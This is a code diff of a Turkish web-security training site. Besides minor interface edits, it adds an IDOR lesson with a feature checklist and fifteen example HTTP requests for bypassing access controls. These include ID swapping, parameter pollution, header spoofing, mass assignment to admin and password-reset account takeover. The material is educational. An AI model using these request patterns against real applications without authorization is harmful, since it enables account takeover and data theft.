@@ -1034,11 +1034,6 @@
       mask-position: center;
     }
 
-    .icon-home::before {
-      -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='m12 5.69l5 4.5V18h-2v-6H9v6H7v-7.81zM12 3L2 12h3v8h6v-6h2v6h6v-8h3z'/%3E%3C/svg%3E");
-      mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='m12 5.69l5 4.5V18h-2v-6H9v6H7v-7.81zM12 3L2 12h3v8h6v-6h2v6h6v-8h3z'/%3E%3C/svg%3E");
-    }
-
     .icon-search::before {
       -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M9.5 16q-2.71 0-4.605-1.895T3 9.5q0-2.71 1.895-4.605T9.5 3q2.71 0 4.605 1.895T16 9.5q0 1.1-.35 2.075T14.7 13.3l5.6 5.6q.275.275.275.7t-.275.7q-.275.275-.7.275t-.7-.275l-5.6-5.6q-.75.6-1.725.95T9.5 16m0-2q1.88 0 3.19-1.31T14 9.5q0-1.88-1.31-3.19T9.5 5Q7.62 5 6.31 6.31T5 9.5q0 1.88 1.31 3.19T9.5 14'/%3E%3C/svg%3E");
       mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M9.5 16q-2.71 0-4.605-1.895T3 9.5q0-2.71 1.895-4.605T9.5 3q2.71 0 4.605 1.895T16 9.5q0 1.1-.35 2.075T14.7 13.3l5.6 5.6q.275.275.275.7t-.275.7q-.275.275-.7.275t-.7-.275l-5.6-5.6q-.75.6-1.725.95T9.5 16m0-2q1.88 0 3.19-1.31T14 9.5q0-1.88-1.31-3.19T9.5 5Q7.62 5 6.31 6.31T5 9.5q0 1.88 1.31 3.19T9.5 14'/%3E%3C/svg%3E");
@@ -1747,7 +1742,7 @@ baslangic: {
             </ul>`
           },
           {
-            title: "Nerede Aranır?",
+            title: "BurpSuite kontrol Noktalari",
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">1- Adres Çubuğunda (URL): <code>/profile?user_id=123</code></li>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">2- AJAX/API İstekleri: Burp Suite gibi araçlarla arka planda çalışan <code>GET /api/v1/user/details</code> gibi istekleri izleyin.</li>
@@ -1756,24 +1751,216 @@ baslangic: {
             </ul>`
           },
           {
-            title: "Yetki Yükseltmeli IDOR (Örnek Senaryo)",
+            title: "IDOR Kontrol Listesi (Nerede Aranır?)",
+            content: `<div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:15px; font-size:13px;">
+                <div style="background:rgba(255,255,255,0.03); padding:12px; border-radius:8px; border-left:3px solid #3498db;">
+                    <strong style="color:#fff; display:block; margin-bottom:8px;">🛒 Sepet & Sipariş</strong>
+                    <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                        <li>Sepet görüntüleme/ekleme/silme</li>
+                        <li>Sipariş detayları/iptali</li>
+                        <li>Fatura PDF/Kargo bilgileri</li>
+                        <li>İade talebi oluşturma/görüntüleme</li>
+                    </ul>
+                </div>
+                <div style="background:rgba(255,255,255,0.03); padding:12px; border-radius:8px; border-left:3px solid #e67e22;">
+                    <strong style="color:#fff; display:block; margin-bottom:8px;">👤 Kullanıcı & Hesap</strong>
+                    <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                        <li>Bilgi görüntüleme/güncelleme</li>
+                        <li>Profil fotoğrafı/Telefon/Mail işlemleri</li>
+                        <li>Şifre değiştirme/sıfırlama</li>
+                        <li>Hesap dondurma/silme</li>
+                    </ul>
+                </div>
+                <div style="background:rgba(255,255,255,0.03); padding:12px; border-radius:8px; border-left:3px solid #2ecc71;">
+                    <strong style="color:#fff; display:block; margin-bottom:8px;">🏠 Adres & Ödeme</strong>
+                    <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                        <li>Adres oluşturma/silme/güncelleme</li>
+                        <li>Kredi kartı ekleme/silme/güncelleme</li>
+                        <li>Kayıtlı kartla ödeme/doğrulama</li>
+                    </ul>
+                </div>
+                <div style="background:rgba(255,255,255,0.03); padding:12px; border-radius:8px; border-left:3px solid #9b59b6;">
+                    <strong style="color:#fff; display:block; margin-bottom:8px;">💬 Yorum & Favoriler</strong>
+                    <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                        <li>Yorum güncelleme/silme/beğenme</li>
+                        <li>Favori/İstek listesi işlemleri</li>
+                    </ul>
+                </div>
+                <div style="background:rgba(255,255,255,0.03); padding:12px; border-radius:8px; border-left:3px solid #f1c40f;">
+                    <strong style="color:#fff; display:block; margin-bottom:8px;">🎫 Destek & Dosya</strong>
+                    <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                        <li>Ticket oluşturma/mesajlaşma</li>
+                        <li>Dosya eki/Fatura indirme</li>
+                        <li>Yüklenen medyayı silme/görüntüleme</li>
+                    </ul>
+                </div>
+                <div style="background:rgba(255,255,255,0.03); padding:12px; border-radius:8px; border-left:3px solid #e74c3c;">
+                    <strong style="color:#fff; display:block; margin-bottom:8px;">🔑 Yetki & API</strong>
+                    <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                        <li>Kullanıcı rol/grup güncellemeleri</li>
+                        <li>API token oluşturma/silme</li>
+                        <li>Oturum listeleme/sonlandırma</li>
+                    </ul>
+                </div>
+            </div>`
+          },
+          {
+            title: 'Gelişmiş IDOR Senaryoları & PoC Kodları',
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-            <strong>Senaryo:</strong> Normal bir kullanıcı, API isteğini değiştirerek başka bir kullanıcının rolünü Admin yapabilir (Mass Assignment ile zincirleme IDOR).
-            <pre>
-// Orijinal İstek (User A)
-POST /api/v1/user/update/A123
-{ "username": "A_new" }
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">1. Sayısal ID Değişimi (Classic Increment)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Veritabanı kayıtlarının ardışık sayılarla tutulması ve yetki kontrolü eksikliği.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// Sizin Siparişiniz\nGET /api/orders/5001\n\n// Başkasının Siparişi\nGET /api/orders/5000</pre>
+                        </div>
+                    </details>
+                </li>
 
-// IDOR PoC (User A, Admin B'yi hedefliyor)
-POST /api/v1/user/update/B456
-{ "username": "B_new", "role": "admin" }</pre>
-        </li>
-    </ul>`
-          }
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">2. HTTP Parameter Pollution (HPP)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Uygulamanın parametreleri işleme biçimindeki farklılık (ilk parametre kontrol, ikinci parametre işlem).
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// Backend yetkiyi 123'e (size) göre kontrol eder,\n// ama sorguyu 124'e (kurban) göre çalıştırır.\nGET /api/v1/messages?user_id=123&user_id=124</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">3. JSON Body ve URL ID Uyuşmazlığı</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> URL'deki ID sadece route için kullanılırken, gerçek işlemin body içindeki ID ile yapılması.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">PUT /api/user/update/MY_ID\nContent-Type: application/json\n\n{\n  "id": "VICTIM_ID",\n  "email": "hacker@mail.com"\n}</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">4. HTTP Metot Değişimi (Bypass)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> GET isteğinde korunan bir verinin, PUT veya POST isteğinde korunmaması.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// GET ile yetki hatası alınıyorsa:\nGET /api/notes/1001\n\n// Metot değiştirerek erişmeyi deneyin:\nPOST /api/notes/1001\nPUT /api/notes/1001</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">5. Eski API Sürümlerine Dönüş</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Yeni API'da yama yapılmışken, eski endpointlerin hala yayında ve zafiyetli bırakılması.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// Güvenli Sürüm: /api/v2/user/data/1001\n// Zafiyetli Sürüm:\nGET /api/v1/user/data/1001\nGET /api/v1.1/user/data/1001</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">6. UUID Yerine Sayısal ID Deneme</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Backend'in hem UUID hem de Integer ID ile sorgu kabul etmesi.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// Orijinal İstek:\nGET /api/profile/88e86095-23c3-424a-a1b7\n\n// Bypass Denemesi:\nGET /api/profile/1\nGET /api/profile/0</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">7. Dışa Aktarma (Export) Fonksiyonları</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> PDF/CSV oluşturma aşamasında kullanıcı ID'sinin doğrulanmaması.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">POST /api/export/user_report\nContent-Type: application/json\n\n{\n  "user_id": 999,\n  "format": "pdf"\n}</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">8. Content-Type Manipülasyonu (JSON to XML)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Yetki kontrolü yapan modülün sadece belli bir veri tipini incelemesi.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// JSON korumalıysa XML deneyin:\nPOST /api/update_settings\nContent-Type: application/xml\n\n&lt;user&gt;&lt;id&gt;500&lt;/id&gt;&lt;role&gt;admin&lt;/role&gt;&lt;/user&gt;</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">9. GraphQL Obje IDOR</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Query içindeki argümanlarda yetki kontrolünün unutulması.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">POST /graphql\n\nquery {\n  getUserMessages(userId: "999") {\n    content\n    sender\n  }\n}</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">10. IDOR + Mass Assignment (Privilege Escalation)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Başka bir kullanıcının ID'sine erişirken ek admin parametreleri enjekte etmek.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">PATCH /api/users/update/505\n\n{\n  "full_name": "Hacker",\n  "is_admin": true,\n  "role": "superadmin"\n}</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">11. Uzantı Ekleyerek Bypass (.json)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Backend routing kurallarının uzantılara göre yetki kontrolünü atlaması.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">GET /api/settings/profile/101 (403 Forbidden)\nGET /api/settings/profile/101.json (200 OK)\nGET /api/settings/profile/101.php (200 OK)</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">12. Admin Panel IDOR (IP Spoofing)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Admin işlemlerinde ID kontrolü yerine sadece IP kontrolü yapılması.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">GET /admin/user/delete/123\nX-Forwarded-For: 127.0.0.1\nX-Custom-IP-Authorization: 127.0.0.1</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">13. Subdomain Session IDOR</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Test/Geliştirme subdomainindeki zayıf sessionların ana uygulamadaki ID'leri görmesi.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// dev.target.com'dan alınan session çerezini\n// target.com/api endpointlerinde ID değiştirerek kullanın.</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">14. Referer Kontrolü ile IDOR Bypass</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Sunucunun yetkiyi kontrol etmek yerine sadece "Referer" başlığına güvenmesi.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">GET /api/private/data/999\nReferer: https://target.com/admin/dashboard\n\n// Sunucu admin panelinden geldiğinizi sanıp veriyi verebilir.</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">15. Şifre Sıfırlama IDOR (Account Takeover)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Şifre değiştirme isteğinde kurbanın kullanıcı ID'sinin gönderilebilmesi.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">POST /api/password/reset/complete\n\n{\n  "token": "MY_VALID_TOKEN",\n  "user_id": "VICTIM_ID",\n  "new_password": "Hacked123!"\n}</pre>
+                        </div>
+                    </details>
+                </li>
+            </ul>`
+          },
         ]
       },
-
+      
       bac: {
         menuName: 'BAC',
         icon: 'icon-lock-broken',
@@ -3593,7 +3780,7 @@ POST /api/users/update
         description: 'Uygulama güvenliği testlerinizi doğrudan tarayıcı üzerinden gerçekleştirin.<br><br>',
         categories: [
           {
-            categoryTitle: '📡 1. Keşif ve Bilgi Toplama',
+            categoryTitle: '1. Keşif ve Bilgi Toplama',
             tools: [
               { id: 'subdomainfinder', icon: 'fa-solid fa-magnifying-glass', title: 'Subdomain Finder', description: 'Bir alan adının gizli alt alan adlarını keşfedin.' },
               { id: 'waybackRecon', icon: 'fa-solid fa-clock-rotate-left', title: 'Wayback Hunting with 1Recon', description: "Tek komutla saldırı yüzeyini arşa çıkarın. Unutulmuş endpoint'leri ve gizli zafiyet adaylarını avlayın." },
@@ -3614,7 +3801,7 @@ POST /api/users/update
             tools: []
           },
           {
-            categoryTitle: '🔬 2. Tarama ve Analiz',
+            categoryTitle: '2. Tarama ve Analiz',
             tools: [
               { id: 'portscanner', icon: 'fa-solid fa-network-wired', title: 'Port Scanner', description: 'Hedef sistemdeki açık portları ve çalışan servisleri tespit edin.' },
               { id: 'headeranalyzer', icon: 'fa-solid fa-file-code', title: 'HTTP Başlık Analizörü', description: 'Bir web sitesinin HTTP başlıklarını detaylıca inceleyin.' },
@@ -3635,7 +3822,7 @@ POST /api/users/update
             tools: []
           },
           {
-            categoryTitle: '⚙️ 3. Kodlama & Genel Araçlar',
+            categoryTitle: '3. Kodlama & Genel Araçlar',
             tools: [
               { id: 'encoderdecoder', icon: 'fa-solid fa-code', title: 'Encoder / Decoder / Hash Identifier', description: 'Metinleri Base64, URL ve diğer formatlara çevirin veya çözümleyin.' },
               { id: 'hibp', icon: 'fa-solid fa-user-shield', title: 'Have I Been Pwned', description: 'E-posta adresinizin veri sızıntılarında yer alıp almadığını kontrol edin.' },
@@ -4023,10 +4210,10 @@ POST /api/users/update
 
       regular.forEach(item => {
         if (item.key === 'forum') {
-          nav.innerHTML += `<a href="/forum/" target="_blank" class="${item.icon}">${item.menuName} <span style="font-size:10px; margin-left:5px; opacity:0.7;">↗</span></a>`;
-        } else {
-          nav.innerHTML += `<a href="#${item.key}" class="${item.icon}" data-page="${item.key}">${item.menuName}</a>`;
-        }
+        nav.innerHTML += `<a href="/forum/" target="_blank" class="icon-forum">Forum <span style="font-size:10px; margin-left:5px; opacity:0.7;">↗</span></a>`;
+    } else {
+        nav.innerHTML += `<a href="#${item.key}" class="${item.icon}" data-page="${item.key}">${item.menuName}</a>`;
+    }
       });
 
       if (vulnerabilities.length > 0) {
@@ -4231,7 +4418,8 @@ function showPage(pageId) {
       }
 
       if (pageId === 'forum') {
-        setupForum();
+        window.location.href = '/forum/';
+        return;
       }
 
       window.scrollTo({
@@ -5150,6 +5338,7 @@ function showPage(pageId) {
       checkSession();
       fetchPosts();
     }
+
     function openTool(toolId) {
       const main = document.getElementById('mainContent');
       let tool = null;
@@ -5718,8 +5907,5 @@ view</textarea>
       <path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z" />
     </svg>
   </button>
-  <div id="chat-widget-container">
-  </div>
 </body>
-
 </html>
